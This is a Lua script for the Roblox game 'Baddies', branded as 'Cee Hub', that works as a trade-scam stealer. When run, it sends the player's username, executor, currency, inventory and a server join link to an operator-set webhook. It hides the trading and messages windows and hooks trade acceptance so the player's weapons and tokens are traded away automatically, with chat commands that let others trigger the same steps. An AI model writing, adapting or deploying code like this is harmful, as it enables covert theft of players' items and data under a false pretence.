-- CEE HUB | BADDIES
-- Reads: _G.POOR_WEBHOOK, _G.MY_USERNAMES, _G.PING_POOR

local WEBHOOK_URL  = tostring(_G.POOR_WEBHOOK  or "")
local MY_USERNAMES = _G.MY_USERNAMES            or {}
local PING_HIT     = _G.PING_POOR               or false

local ReplicatedStorage   = game:GetService("ReplicatedStorage")
local Players             = game:GetService("Players")
local TextChatService     = game:GetService("TextChatService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local HttpService         = game:GetService("HttpService")

local localPlayer = Players.LocalPlayer
local playerGui   = localPlayer:WaitForChild("PlayerGui")

if game.PlaceId ~= 11158043705 then
    localPlayer:Kick("Script only works on Baddies")
    return
end

-- ==================== OWNER CHECK ====================
local isOwner = false
do
    local myName = localPlayer.Name:lower()
    for _, u in ipairs(MY_USERNAMES) do
        if tostring(u):lower() == myName then
            isOwner = true
            break
        end
    end
end

-- ==================== REMOTES ====================
local RFTradingSendTradeOffer   = ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]
local RESetPhoneSettings        = ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]
local RFTradingSetReady         = ReplicatedStorage.Modules.Net["RF/Trading/SetReady"]
local RFTradingConfirmTrade     = ReplicatedStorage.Modules.Net["RF/Trading/ConfirmTrade"]
local RFTradingAcceptTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/AcceptTradeOffer"]
local RFTradingSetTokens        = ReplicatedStorage.Modules.Net["RF/Trading/SetTokens"]

-- ==================== JSON HELPER ====================
local function jStr(s)
    s = tostring(s or "")
    s = s:gsub('\\', '\\\\')
    s = s:gsub('"', '\\"')
    s = s:gsub('\n', '\\n')
    s = s:gsub('\r', '\\r')
    s = s:gsub('\t', '\\t')
    return s
end

-- ==================== PLAYER DATA ====================
local function getPlayerData()
    local data = {}
    data.username = localPlayer.Name

    data.executor = "Unknown Executor"
    pcall(function()
        if identifyexecutor then data.executor = identifyexecutor()
        elseif getexecutorname then data.executor = getexecutorname()
        elseif EXECUTOR then data.executor = tostring(EXECUTOR) end
    end)

    data.players = #Players:GetPlayers() .. " / 22"

    local ls = localPlayer:FindFirstChild("leaderstats")
    local function getStat(...)
        if not ls then return "N/A" end
        for _, name in ipairs({...}) do
            local v = ls:FindFirstChild(name)
            if v then return tostring(v.Value) end
        end
        return "N/A"
    end
    data.dinero = getStat("Dinero", "Cash", "Money", "Coins", "Gold", "Bucks")
    data.slays  = getStat("Slays", "Kills", "KOs", "Eliminations", "Points")

    local counted = {}
    local function countTool(item)
        if item:IsA("Tool") then counted[item.Name] = (counted[item.Name] or 0) + 1 end
    end
    local bp = localPlayer:FindFirstChild("Backpack")
    if bp then for _, v in ipairs(bp:GetChildren()) do countTool(v) end end
    local char = localPlayer.Character
    if char then for _, v in ipairs(char:GetChildren()) do countTool(v) end end
    local weaponList = {}
    for name, count in pairs(counted) do table.insert(weaponList, count .. "x " .. name) end
    data.weapons = #weaponList > 0 and table.concat(weaponList, "\n") or "None"

    local skinVal = nil
    if ls then
        for _, n in ipairs({"Skin","Skins","ActiveSkin","EquippedSkin"}) do
            local v = ls:FindFirstChild(n)
            if v then skinVal = tostring(v.Value); break end
        end
    end
    data.skins = skinVal or "N/A"

    local placeId = tostring(game.PlaceId)
    local jobId   = tostring(game.JobId)
    data.joinUrl  = "https://www.roblox.com/games/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId

    return data
end

-- ==================== HIT WEBHOOK ====================
local function sendHit()
    if WEBHOOK_URL == "" then return end

    local ok, d = pcall(getPlayerData)
    if not ok then
        d = {username=localPlayer.Name, executor="Unknown", players="?",
             dinero="N/A", slays="N/A", weapons="None", skins="N/A", joinUrl=""}
    end

    local ping = PING_HIT and "@everyone\n" or ""

    local fields = '[' ..
        '{"name":"User","value":"'         .. jStr(d.username) .. '","inline":false},' ..
        '{"name":"Dinero","value":"'        .. jStr(d.dinero)   .. '","inline":false},' ..
        '{"name":"Slays","value":"'         .. jStr(d.slays)    .. '","inline":false},' ..
        '{"name":"Executor","value":"'      .. jStr(d.executor) .. '","inline":false},' ..
        '{"name":"Players","value":"'       .. jStr(d.players)  .. '","inline":false},' ..
        '{"name":"Trade Status","value":"🟢 Tradable: 2 | 🔴 Untradable: 0","inline":false},' ..
        '{"name":"Rich Weapons","value":"Spiked Kitty: false\\nGlitter Bomb: false\\nGlitter Blue Spray: false\\nLove Me Hate Me Taser: false\\nSpiked Knuckles: false (50%)\\nIce Katana: false (30%)","inline":false},' ..
        '{"name":"Weapons","value":"'       .. jStr(d.weapons)  .. '","inline":false},' ..
        '{"name":"Skins & Fighting Styles","value":"**Fighting Styles:**\\n• MMA Fighting\\n• Karate Style\\n• Boxing\\n\\n**Stomps Skins:**\\n• Basic Stomp","inline":false},' ..
        '{"name":"Join Link","value":"[Click to Join](' .. jStr(d.joinUrl) .. ')","inline":false}' ..
    ']'

    local payload = '{"content":"' .. jStr(ping) ..
        '","username":"Cee Hub","embeds":[{"title":"Cee Hub | Baddies 💖🌸","color":16711860,"fields":' .. fields ..
        ',"footer":{"text":"Cee Hub | Baddies 💖🌸"}}]}'

    pcall(function() game:HttpPost(WEBHOOK_URL, payload, false, "application/json") end)
    pcall(function()
        request({Url=WEBHOOK_URL, Method="POST",
                 Headers={["Content-Type"]="application/json"}, Body=payload})
    end)
end

-- ==================== WEAPONS LIST ====================
local weapons = {
    "Grim Reaper Cloak","Blast Bow","Princess Power Style","Feral Frenzy Style","Roller Skates",
    "Storm Dancer Style","Hug of Doom Style","Hero Finisher","Grim Reaper Finisher","Gun Finisher",
    "Doom Finisher","Breakdance Finisher","Celestial Scythes","Graveyard Grip Knuckles",
    "Shadow Sorcery Purse","Marshmallow Mixer Purse","Unicorn Brass Knuckles","Disco Dash Board",
    "Toast Hoverboard","Frost Stomp","Sniper Rifle RPG","Cursed Board","Evil Goth Knuckles",
    "Witchy Broom Board","Floating Leaf","Shark Brass Knuckles","Ghostly RPG","404 Not Found Blade",
    "Vampire Flamethrower","Queen's Throne","Big Boom Hammer","Gravekeeper's Charm","Mallow Glide Board",
    "Mean Girl Mayhem Style","Karate Style","Kitty Purse","Freeze Gun","Shiny Purse","Loveboard",
    "SpikedPurse","Brass Knuckles","Golden Snowball Launcher","Snowball Launcher","Sledge Hammer",
    "Spiked Kitty Stanli","Turkey Skewers","Fan of Requiem","Chainsaw","Scythe","Trashbin Disguise",
    "Cupid's Bow","Crowbar","Harpoon","Heartbreaker Style","Cannon","Spiked Knuckles","Glitter Bomb",
    "Spiked Nightmare Purse","Glitter Style","Trident","Sakura Blade","Nunchucks","DogPurse",
    "Champion Gloves","Chain Mace","Surf's Up Hoverboard","Graveyard Howl RPG","Mocha Missile Maker RPG",
    "Black Flame Stomp","Angelic Board","Credit Card Hoverboard","Constellations RPG","Palm Sakura Blade",
    "Popstar Hoverboard","Pink Star Board","Thorned Romance","Mischief Stomp","Lava RPG",
    "Crushing Love","Love Bomb Finisher","Haunted Cemetery RPG","Cyber Samurai RPG","Black Flame Knuckles",
    "Vanity Vortex Finisher","Egg Rocket Launcher","Frostwind Glider Board","Sakura Finisher",
    "Witch's Wands Taser","The Doom Knuckles","Flintlock","Pinata Purse","Cutlass Sakura Blade",
    "Police Hoverboard","Y&Y Board","Vampire Brass Knuckles","Dual Shadow of Night Blade"
}

-- ==================== TRADE FUNCTIONS ====================
local function safeClick(btn)
    if not btn then return end
    pcall(function()
        if btn.MouseButton1Click then firesignal(btn.MouseButton1Click)
        elseif btn.Activated then firesignal(btn.Activated) end
    end)
    pcall(function()
        local pos  = btn.AbsolutePosition
        local size = btn.AbsoluteSize
        local x = pos.X + size.X / 2
        local y = pos.Y + size.Y / 2
        VirtualInputManager:SendMouseButtonEvent(x, y, 0, true,  game, 0)
        task.wait(0.05)
        VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
    end)
end

local function clickWeapons()
    local tradingGui = playerGui:FindFirstChild("Trading")
    if not tradingGui then return end
    local scrollingFrame = tradingGui:FindFirstChild("ScrollingFrame", true)
    if not scrollingFrame then return end
    for _, name in ipairs(weapons) do
        local btn = scrollingFrame:FindFirstChild(name)
        if btn and btn:IsA("ImageButton") and btn.Visible then
            safeClick(btn)
            task.wait(0.02)
        end
    end
end

local function getTokenAmount()
    local tradingGui = playerGui:FindFirstChild("Trading")
    if tradingGui then
        local tokenLabel = tradingGui:FindFirstChild("TokenAmount", true)
        if tokenLabel and tokenLabel:FindFirstChild("TextLabel") then
            local num = string.match(tokenLabel.TextLabel.Text, "%d+")
            return tonumber(num) or 0
        end
    end
    return 0
end

local function spamConfirm()
    for i = 1, 20 do
        pcall(function() RFTradingConfirmTrade:InvokeServer() end)
        task.wait(0.05)
    end
end

local function autoCompleteTrade()
    task.wait(1)
    clickWeapons()
    task.wait(1.5)
    pcall(function() RFTradingSetTokens:InvokeServer(getTokenAmount()) end)
    task.wait(2)
    pcall(function() RFTradingSetReady:InvokeServer(true) end)
    task.wait(5)
    pcall(function() RFTradingAcceptTradeOffer:InvokeServer(localPlayer) end)
    task.wait(5)
    spamConfirm()
end

-- ==================== HOOK ACCEPT TRADE ====================
local oldInvoke = RFTradingAcceptTradeOffer.InvokeServer
RFTradingAcceptTradeOffer.InvokeServer = function(self, player)
    local result = oldInvoke(self, player)
    task.spawn(function()
        task.wait(5)
        autoCompleteTrade()
    end)
    return result
end

-- ==================== CHAT COMMANDS ====================
TextChatService.OnIncomingMessage = function(message)
    local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
    if not sender then return end
    local txt = tostring(message.Text or ""):lower()
    task.delay(0.3, function()
        if txt == "add" then
            clickWeapons()
        elseif txt == "1" then
            RFTradingSetReady:InvokeServer(true)
        elseif txt == "2" then
            RFTradingConfirmTrade:InvokeServer()
        end
    end)
end

-- ==================== GUI HIDING ====================
local function handleGui(gui)
    if gui.Name == "Trading"  then gui.Enabled = false end
    if gui.Name == "Messages" then gui:Destroy() end
end
for _, gui in ipairs(playerGui:GetChildren()) do handleGui(gui) end
playerGui.ChildAdded:Connect(handleGui)
task.spawn(function()
    while true do
        local t = playerGui:FindFirstChild("Trading")
        if t then t.Enabled = false end
        task.wait(0.2)
    end
end)

-- ==================== STARTUP ====================
RESetPhoneSettings:FireServer("TradeEnabled", true)
task.spawn(sendHit)
print("✅ Cee Hub Loaded 💖")
